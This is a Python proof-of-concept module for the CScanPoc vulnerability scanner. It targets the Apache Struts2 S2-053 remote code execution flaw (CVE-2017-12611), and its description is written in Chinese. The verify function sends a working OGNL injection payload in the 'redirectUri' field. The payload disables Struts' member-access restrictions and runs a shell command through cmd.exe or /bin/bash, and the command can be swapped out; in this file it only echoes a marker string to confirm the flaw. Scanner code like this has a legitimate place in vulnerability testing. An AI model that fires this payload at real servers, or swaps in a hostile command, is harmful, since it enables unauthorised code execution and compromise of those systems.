# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Apache_Struts_0002_p'  # 平台漏洞编号，留空
    name = 'Apache Struts2 S2-053远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2017-09-07'  # 漏洞公布时间
    desc = '''
        Struts2 是Apache软件基金会负责维护的一个基于MVC设计模式的Web应用框架开源项目。 
        Apache Struts2存在S2-053远程代码执行漏洞，在Freemarker标记中使用错误的表达式而不是字符串文字时，导致攻击者远程执行代码攻击。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-25632'  # 漏洞来源
    cnvd_id = 'CNVD-2017-25632'  # cnvd漏洞编号
    cve_id = 'CVE-2017-12611'  # cve编号
    product = 'Apache-Struts'  # 漏洞应用名称
    product_version = 'Apache Struts2 >=2.0.1，<=2.3.33 ，Apache Struts2 >=2.5，<=2.5.10'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '93aa5961-70fd-459a-8a42-bf81e1aeb50a'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            data = {'redirectUri': '''
            %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo 92933839f1efb2da9a4799753ee8d79c').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
    
            '''}
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            request = requests.post(self.target, data=data)
            r = request.text
            if '92933839f1efb2da9a4799753ee8d79c' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
